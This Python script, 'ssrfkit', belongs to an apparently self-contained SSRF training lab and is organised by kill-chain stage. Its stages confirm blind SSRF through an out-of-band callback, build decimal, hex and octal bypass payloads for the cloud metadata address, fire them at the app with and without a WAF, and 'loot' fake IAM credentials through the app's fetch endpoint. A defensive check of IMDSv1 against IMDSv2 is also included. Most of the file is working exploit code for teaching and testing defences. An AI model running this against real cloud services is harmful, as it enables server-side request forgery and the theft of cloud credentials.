#!/usr/bin/env python3
"""
ssrfkit — unified SSRF toolkit for the SSRF Lab, mapped to the Cyber Kill Chain
================================================================================
⚠️  LAB-ONLY. Point this ONLY at the lab's own services. Using these techniques
against systems you do not own or lack written permission to test is illegal.
See ../SECURITY.md.

This is one entrypoint that REUSES the existing toolkit modules (no duplication):
  - ssrf_payloads.build_urls   -> alternate IP-encoding payloads
  - ssrf_scan.probe/payloads   -> firing payloads at the app and classifying
  - imds_check.probe_v1/v2     -> IMDSv1 vs IMDSv2 audit
  - oob-listener (lab service) -> confirming BLIND SSRF out-of-band

Subcommands follow the kill chain:
  recon      Reconnaissance    detect SSRF, incl. blind SSRF via an OOB callback
  weaponize  Weaponization     craft the bypass payloads
  exploit    Exploitation      fire payloads at the app, with and without the WAF
  loot       Actions on Obj.   exfiltrate the (fake) IAM credentials via SSRF
  audit      (defensive)       check whether metadata enforces IMDSv1 or IMDSv2
  full       run recon -> weaponize -> exploit -> loot as a guided demo

Designed to run INSIDE the lab network (so it can reach the internal services),
e.g. from the repo root with the lab running:

    docker run --rm --network ssrf-lab_ssrflab -v "${PWD}/toolkit:/t" \
        python:3.12-slim python /t/ssrfkit.py full
"""
from __future__ import annotations

import argparse
import html as htmllib
import json
import re
import sys
import time
import uuid
import urllib.error
import urllib.parse
import urllib.request

# Reuse the existing toolkit modules (they live next to this file).
from ssrf_payloads import build_urls
from ssrf_scan import CREDS_PATH, classify, payloads, probe
import imds_check

DEFAULTS = {
    "app": "http://vulnerable-app:5000",   # the vulnerable app, inside the lab
    "waf": "http://waf:8080",              # same app via the WAF edge
    "oob": "http://oob-listener.lab",      # OOB callback collector
    "metadata": "http://169.254.169.254",  # mock metadata base
    "metadata_ip": "169.254.169.254",
}

_USE_COLOR = sys.stdout.isatty()
_PRE_RE = re.compile(r"<pre>(.*?)</pre>", re.S)


def _c(text, code):
    return f"\033[{code}m{text}\033[0m" if _USE_COLOR else text


def _stage(title, subtitle):
    bar = "=" * 70
    print("\n" + _c(bar, "36"))
    print(_c(f"  {title}", "1;36") + _c(f"   {subtitle}", "36"))
    print(_c(bar, "36"))


def _get(url, timeout=8):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001 — report transport errors compactly
        return None, f"{type(exc).__name__}: {exc}"


def _app_fetch_url(app_base, level, target):
    query = urllib.parse.urlencode({"level": level, "url": target})
    return f"{app_base}/fetch?{query}"


def _extract_pre(html_text):
    match = _PRE_RE.search(html_text or "")
    return htmllib.unescape(match.group(1)).strip() if match else ""


# --------------------------------------------------------------------------- #
#  Subcommands                                                                 #
# --------------------------------------------------------------------------- #

def cmd_recon(args):
    _stage("RECON", "detect SSRF — including BLIND SSRF via an out-of-band callback")
    token = "ssrfkit-" + uuid.uuid4().hex[:12]
    callback = f"{args.oob}/cb/{token}"
    print(f"Unique token : {token}")
    print(f"Make the app (L{args.level}) fetch our OOB callback:\n  {callback}")

    _get(_app_fetch_url(args.app, args.level, callback))
    time.sleep(0.6)  # give the callback a moment to arrive

    status, body = _get(f"{args.oob}/seen/{token}")
    confirmed = False
    try:
        confirmed = bool(json.loads(body).get("seen"))
    except Exception:  # noqa: BLE001
        pass

    if confirmed:
        print(_c("  [+] OOB callback RECEIVED — blind SSRF CONFIRMED.", "1;32"))
        print("      The app made an outbound request to our listener, proving")
        print("      SSRF even without reading any response body.")
    else:
        print(_c(f"  [-] No callback seen (listener said: {body.strip()}).", "1;31"))
    return confirmed


def cmd_weaponize(args):
    _stage("WEAPONIZE", "craft bypass payloads for the target metadata IP")
    urls = build_urls(args.metadata_ip, CREDS_PATH)
    width = max(len(name) for name in urls)
    for name, url in urls.items():
        print(f"  {name.ljust(width)}  {url}")
    print("\n  (decimal/hex/octal forms defeat a naive string blocklist; a filter")
    print("   that decodes to the real IP, or resolves+pins it, stops them.)")
    return urls


def cmd_exploit(args):
    _stage("EXPLOIT", "fire payloads at the app — without the WAF vs through it")
    tests = payloads(args.metadata_ip)
    width = max(len(name) for name, _ in tests)
    print("  " + "payload".ljust(width) + "  " + "no-WAF".ljust(10) + "via-WAF")
    print("  " + "-" * (width + 20))
    for name, url in tests:
        direct = probe(args.app, args.level, url)
        viawaf = probe(args.waf, args.level, url)
        print("  " + name.ljust(width) + "  " + direct.ljust(10) + viawaf)
    print("\n  LOOT = fake creds · BLOCKED = app filter · WAF-403 = WAF refused ·"
          " FETCHED = non-creds · REQ-ERR = transport")


def cmd_loot(args):
    _stage("LOOT", "exfiltrate the (fake) IAM credentials via SSRF")
    target = f"{args.metadata}/latest/meta-data/iam/security-credentials/lab-ec2-demo-role"
    print(f"  SSRF target (L{args.level}): {target}")
    _status, html_body = _get(_app_fetch_url(args.app, args.level, target))
    verdict = classify(html_body) if html_body else "REQ-ERR"
    pre = _extract_pre(html_body)

    if verdict == "LOOT":
        print(_c("  [+] CREDENTIALS EXFILTRATED:", "1;32"))
        for line in pre.splitlines():
            print("      " + line)
    elif verdict == "BLOCKED":
        print(_c("  [-] Blocked by the app filter (L1-L3 defense active).", "1;33"))
        print("      " + pre.splitlines()[0] if pre else "")
    else:
        # e.g. the metadata returned 401 because IMDSv2 is enforced.
        print(_c("  [-] No credentials returned.", "1;33"))
        if pre:
            print("      endpoint said: " + pre.splitlines()[0])
        print("      (expected when IMDSv2 is enforced: a bare SSRF GET cannot do"
              " the PUT-token dance.)")


def cmd_audit(args):
    _stage("AUDIT", "defensive — does the metadata endpoint enforce IMDSv1 or IMDSv2?")
    v1_status, _v1_body, v1_leaked = imds_check.probe_v1(args.metadata)
    print(f"  IMDSv1 plain GET -> status {v1_status}, creds leaked: {v1_leaked}")
    tok_status, token, v2_get, v2_leaked = imds_check.probe_v2(args.metadata)
    got = v2_get[0] if v2_get else None
    print(f"  IMDSv2 token flow -> PUT {tok_status}"
          + (f", token={token[:10]}..." if token else "")
          + (f", GET {got}, creds: {v2_leaked}" if v2_get else ""))
    if v1_leaked:
        print(_c("  => IMDSv1 behaviour: a bare GET leaks creds. VULNERABLE to basic SSRF.", "1;31"))
    elif v1_status in (401, 403) and v2_leaked:
        print(_c("  => IMDSv2 ENFORCED: bare GET denied; only the token flow works.", "1;32"))
    else:
        print("  => inconclusive (see above).")


def cmd_full(args):
    print(_c("\n  SSRFKIT — full kill-chain demo (LAB-ONLY)", "1;35"))
    print("  Reconnaissance -> Weaponization -> Exploitation -> Actions on Objectives")
    cmd_recon(args)
    cmd_weaponize(args)
    cmd_exploit(args)
    cmd_loot(args)
    _stage("DONE", "that is the full chain: find it, craft it, fire it, loot it")
    print("  Defensive takeaways live in the other levels: app L3 (resolve-then-pin),")
    print("  the WAF layer, and IMDSv2 — run 'ssrfkit audit' and compare levels.")


# --------------------------------------------------------------------------- #
#  CLI                                                                          #
# --------------------------------------------------------------------------- #

def build_parser():
    parser = argparse.ArgumentParser(
        prog="ssrfkit",
        description="Unified SSRF toolkit (LAB-ONLY), mapped to the Cyber Kill Chain.")
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--app", default=DEFAULTS["app"], help="vulnerable app base URL")
    common.add_argument("--waf", default=DEFAULTS["waf"], help="app-via-WAF base URL")
    common.add_argument("--oob", default=DEFAULTS["oob"], help="OOB listener base URL")
    common.add_argument("--metadata", default=DEFAULTS["metadata"], help="metadata base URL")
    common.add_argument("--metadata-ip", default=DEFAULTS["metadata_ip"], help="metadata IP")
    common.add_argument("--level", type=int, default=0, choices=[0, 1, 2, 3],
                        help="defense level to use (default 0)")
    common.add_argument("--no-color", action="store_true", help="disable coloured output")

    sub = parser.add_subparsers(dest="command", required=True)
    for name, func, help_text in [
        ("recon", cmd_recon, "detect SSRF, incl. blind via OOB callback"),
        ("weaponize", cmd_weaponize, "craft bypass payloads"),
        ("exploit", cmd_exploit, "fire payloads at the app (with/without WAF)"),
        ("loot", cmd_loot, "exfiltrate the fake IAM credentials"),
        ("audit", cmd_audit, "check IMDSv1 vs IMDSv2 enforcement"),
        ("full", cmd_full, "run the full kill-chain demo"),
    ]:
        sp = sub.add_parser(name, parents=[common], help=help_text)
        sp.set_defaults(func=func)
    return parser


def main():
    args = build_parser().parse_args()
    if args.no_color:
        global _USE_COLOR
        _USE_COLOR = False
    args.func(args)


if __name__ == "__main__":
    main()
